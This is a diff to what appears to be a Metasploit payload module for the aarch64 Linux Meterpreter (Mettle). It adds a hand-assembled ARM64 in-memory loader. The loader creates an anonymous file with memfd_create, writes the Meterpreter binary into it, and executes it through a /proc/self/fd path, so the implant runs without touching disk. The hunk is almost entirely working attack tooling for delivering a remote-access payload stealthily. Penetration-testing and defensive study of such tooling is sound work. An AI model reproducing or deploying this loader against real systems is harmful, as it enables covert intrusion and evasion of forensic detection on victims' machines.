@@ -36,6 +36,34 @@ module MetasploitModule
       scheme: 'tcp',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('aarch64-linux-musl', generate_config(opts)).to_binary :exec
+    payload = MetasploitPayloads::Mettle.new('aarch64-linux-musl', generate_config(opts)).to_binary :exec
+    in_memory_loader = [
+      0x0a0080d2, # 0x1000:	mov	x10, #0	0x0a0080d2
+      0xea0300f9, # 0x1004:	str	x10, [sp]	0xea0300f9
+      0xe0030091, # 0x1008:	mov	x0, sp	0xe0030091
+      0x210080d2, # 0x100c:	mov	x1, #1	0x210080d2
+      0xe82280d2, # 0x1010:	mov	x8, #0x117	0xe82280d2
+      0x010000d4, # 0x1014:	svc	#0	0x010000d4
+      0xe90300aa, # 0x1018:	mov	x9, x0	0xe90300aa
+      0x10000014, # 0x101c:	b	#0x105c	0x10000014
+      0xea031eaa, # 0x1020:	mov	x10, x30	0xea031eaa
+      0x420140b9, # 0x1024:	ldr	w2, [x10]	0x420140b9
+      0x4a890091, # 0x1028:	add	x10, x10, #0x22	0x4a890091
+      0xe1030aaa, # 0x102c:	mov	x1, x10	0xe1030aaa
+      0x080880d2, # 0x1030:	mov	x8, #0x40	0x080880d2
+      0x010000d4, # 0x1034:	svc	#0	0x010000d4
+      0x214000d1, # 0x1038:	sub	x1, x1, #0x10	0x214000d1
+      0x29c10091, # 0x103c:	add	x9, x9, #0x30	0x29c10091
+      0x290000b9, # 0x1040:	str	w9, [x1]	0x290000b9
+      0x213800d1, # 0x1044:	sub	x1, x1, #0xe	0x213800d1
+      0xe00301aa, # 0x1048:	mov	x0, x1	0xe00301aa
+      0x010080d2, # 0x104c:	mov	x1, #0	0x010080d2
+      0x020080d2, # 0x1050:	mov	x2, #0	0x020080d2
+      0xa81b80d2, # 0x1054:	mov	x8, #0xdd	0xa81b80d2
+      0x010000d4, # 0x1058:	svc	#0	0x010000d4
+      0xf1ffff97, # 0x105c:	bl	#0x1020	0xf1ffff97
+    ].pack('N*')
+    fd_path = '/proc/self/fd/'.bytes.pack('c*') + "\x00" * 16
+    in_memory_loader + [payload.length].pack('V') + fd_path + payload
   end
 end
